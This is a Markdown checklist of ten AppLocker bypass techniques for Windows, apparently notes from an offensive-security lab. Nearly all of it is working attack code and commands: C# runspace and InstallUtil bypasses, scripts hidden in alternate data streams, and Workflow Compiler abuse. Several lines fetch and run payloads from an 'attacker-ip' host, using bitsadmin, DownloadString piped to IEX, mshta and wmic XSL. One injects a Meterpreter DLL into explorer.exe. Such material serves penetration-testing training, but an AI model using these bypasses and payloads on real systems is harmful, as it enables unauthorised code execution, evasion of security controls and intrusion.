## AppLocker Bypass Techniques Checklist

### Technique 1: Trusted Folders (Writable Whitelisted Dirs)
1. Identify writable subfolders in C:\Windows:
   ```
   accesschk.exe "student" C:\Windows -wus
   ```
2. Verify execute permissions (e.g., for C:\Windows\Tasks):
   ```
   icacls.exe C:\Windows\Tasks
   ```
3. Place malicious executable/script in writable dir (e.g., malware.exe in C:\Windows\Tasks):
   ```
   copy C:\Path\to\malware.exe C:\Windows\Tasks\malware.exe
   ```
4. Execute:
   ```
   C:\Windows\Tasks\malware.exe
   ```

### Technique 2: DLL Loading (If DLL Rules Disabled)
1. Enable DLL rules check (admin only, for testing):
   - gpedit.msc > Computer Configuration > Windows Settings > Security Settings > Application Control Policies > AppLocker > Configure rule enforcement > Advanced > Enable DLL rule collection
   ```
   gpupdate /force
   ```
2. Create malicious DLL (e.g., C++ with exported function for payload).
3. Place DLL in user-writable dir (e.g., C:\Users\student\AppData\Local\malicious.dll).
4. Load via whitelisted exe (custom loader calling LoadLibrary):
   ```
   trusted.exe C:\Users\student\AppData\Local\malicious.dll
   ```

### Technique 3: Alternate Data Streams (ADS)
1. Create malicious JScript (test.js):
   ```
   var shell = new ActiveXObject("WScript.Shell");
   var res = shell.Run("cmd.exe");
   ```
2. Embed in ADS of trusted file (e.g., TeamViewer log):
   ```
   type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
   ```
3. Execute:
   ```
   wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
   ```

### Technique 4: Third-Party Execution (e.g., Python)
AppLocker only enforces rules for native Windows file types (.exe, .msi, .ps1, .js, .vbs, .cmd, .bat, .appx). Third-party scripting engines (e.g., Python, Perl) or runtimes (e.g., Java) are not covered, allowing execution of unmonitored scripts.
1. Check if Python installed.
2. Create malicious Python script (malware.py):
   ```python
   import os
   os.system("cmd.exe")
   ```
3. Execute:
   ```
   python malware.py
   ```

### Technique 5: PowerShell Custom Runspace (C# Bypass)
A custom runspace created via C# can execute PowerShell scripts outside CLM restrictions, as AppLocker does not apply CLM to custom runspaces.
1. Compile C# (Bypass.exe, release 64-bit):
   ```csharp
   using System;
   using System.Management.Automation;
   using System.Management.Automation.Runspaces;

   namespace Bypass
   {
       class Program
       {
           static void Main(string[] args)
           {
               Runspace rs = RunspaceFactory.CreateRunspace();
               rs.Open();
               PowerShell ps = PowerShell.Create();
               ps.Runspace = rs;
               String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
               ps.AddScript(cmd);
               ps.Invoke();
               rs.Close();
           }
       }
   }
   ```
   - Add ref: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
     - Steps: Right-click References > Add Reference > Browse > Select the DLL.
2. Place in whitelisted dir:
   ```
   copy Bypass.exe C:\Windows\Tasks\Bypass.exe
   ```
3. Execute:
   ```
   C:\Windows\Tasks\Bypass.exe
   type C:\Tools\test.txt  # Should show FullLanguage
   ```
4. For PowerUp priv esc:
   - Update cmd: `String cmd = "(New-Object System.Net.WebClient).DownloadString('<http://192.168.119.120/PowerUp.ps1>') | IEX; Invoke-AllChecks | Out-File -FilePath C:\\\\Tools\\\\test.txt";`
   - Recompile, execute as above.

### Technique 6: PowerShell InstallUtil (Living Off the Land)
1. Compile C# (Bypass.exe, release 64-bit):
   ```csharp
   using System;
   using System.Management.Automation;
   using System.Management.Automation.Runspaces;
   using System.Configuration.Install;

   namespace Bypass
   {
       class Program
       {
           static void Main(string[] args)
           {
               Console.WriteLine("This is the main method which is a decoy");
           }
       }

       [System.ComponentModel.RunInstaller(true)]
       public class Sample : System.Configuration.Install.Installer
       {
           public override void Uninstall(System.Collections.IDictionary savedState)
           {
               String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
               Runspace rs = RunspaceFactory.CreateRunspace();
               rs.Open();
               PowerShell ps = PowerShell.Create();
               ps.Runspace = rs;
               ps.AddScript(cmd);
               ps.Invoke();
               rs.Close();
           }
       }
   }
   ```
   - Add refs: System.Management.Automation.dll, System.Configuration.Install
      - Resolve System.Configuration.Install by adding a reference in Visual Studio: References > Add Reference > Assemblies > Select System.Configuration.Install.
2. Obfuscate (optional, base64 encode):
   ```
   certutil -encode Bypass.exe file.txt
   ```
3. Download/decode (on target):
   ```
   bitsadmin /Transfer myJob http://attacker-ip/file.txt C:\Users\student\enc.txt && certutil -decode C:\Users\student\enc.txt C:\Users\student\Bypass.exe && del C:\Users\student\enc.txt
   ```
4. Execute:
   ```
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\student\Bypass.exe
   type C:\Tools\test.txt  # Should show FullLanguage
   ```

### Technique 7: PowerShell Reflective DLL Injection
1. Generate/host DLL (e.g., met.dll) and script (Invoke-ReflectivePEInjection.ps1) on attacker server.
2. Update InstallUtil C# cmd:
   ```csharp
   String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://attacker-ip/met.dll');(New-Object System.Net.WebClient).DownloadString('http://attacker-ip/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
   ```
3. Compile as in Technique 6.
4. Execute as in Technique 6 (InstallUtil command).

### Technique 8: C# Workflow Compiler Bypass
1. Generate XML via PowerShell (run as admin):
   ```powershell
   Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
   $workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
   $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
   $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
   $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
   $compilerparam.GenerateInMemory = $True
   $pathvar = "payload.cs"  # Path to C# payload
   $output = "C:\Tools\input.xml"
   $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
   Move-Item $tmp $output
   ```
2. Create C# payload (payload.cs):
   ```csharp
   using System;
   using System.Workflow.ComponentModel;
   using System.Diagnostics;

   public class MaliciousActivity : Activity
   {
       public MaliciousActivity()
       {
           Process.Start("cmd.exe");
       }
   }
   ```
3. Execute:
   ```
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe C:\Tools\input.xml C:\Tools\output.xml
   ```

### Technique 9: JScript MSHTA
1. Create HTA (test.hta):
   ```html
   <html>
   <head>
   <script language="JScript">
   var shell = new ActiveXObject("WScript.Shell");
   var res = shell.Run("cmd.exe");
   </script>
   </head>
   <body>
   <script language="JScript">
   self.close();
   </script>
   </body>
   </html>
   ```
2. Host on attacker server: /var/www/html/test.hta
3. Create shortcut (.lnk) on target: Location = C:\Windows\System32\mshta.exe http://attacker-ip/test.hta
4. Execute: Double-click .lnk
5. For shellcode: Use SharpShooter to generate HTA, embed DotNetToJScript payload.

### Technique 10: JScript XSL Transform
1. Create XSL (test.xsl):
   ```xml
   <?xml version='1.0'?>
   <stylesheet version="1.0"
   xmlns="http://www.w3.org/1999/XSL/Transform"
   xmlns:ms="urn:schemas-microsoft-com:xslt"
   xmlns:user="http://mycompany.com/mynamespace">

   <output method="text"/>
   	<ms:script implements-prefix="user" language="JScript">
   		<![CDATA[
   			var r = new ActiveXObject("WScript.Shell");
   			r.Run("cmd.exe");
   		]]>
   	</ms:script>
   </stylesheet>
   ```
2. Host on attacker server: /var/www/html/test.xsl
3. Trigger via WMIC:
   ```
   wmic process get brief /format:"http://attacker-ip/test.xsl"
   ```
4. For shortcut: .lnk Location = C:\Windows\System32\cmd.exe /c wmic process get brief /format:"http://attacker-ip/test.xsl"
5. For payload: Embed DotNetToJScript in <ms:script>.
